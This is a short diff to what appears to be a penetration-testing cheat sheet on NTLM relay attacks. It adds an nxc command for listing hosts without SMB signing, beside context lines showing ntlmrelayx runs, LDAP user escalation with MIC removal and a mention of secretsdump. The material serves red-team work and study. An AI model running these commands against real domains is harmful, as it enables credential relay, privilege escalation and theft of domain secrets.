@@ -7,7 +7,8 @@
  - Start ntlmrelayx with options socks:   
    `ntlmrelayx.py -tf targets.txt -smb2support -socks`  
  - Targets (systems without SMB signing) can be gathered with:   
-   `crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt`   
+   `crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt`
+   `nxc smb 10.10.10.0/24 --gen-relay-list relaytargets.txt`
  - Try to escalate a given user:   
    `ntlmrelayx.py -t ldap://dc.domain.local --escalate-user USER --remove-mic -smb2support`   
  - Run secretsdump on domain administrator:   
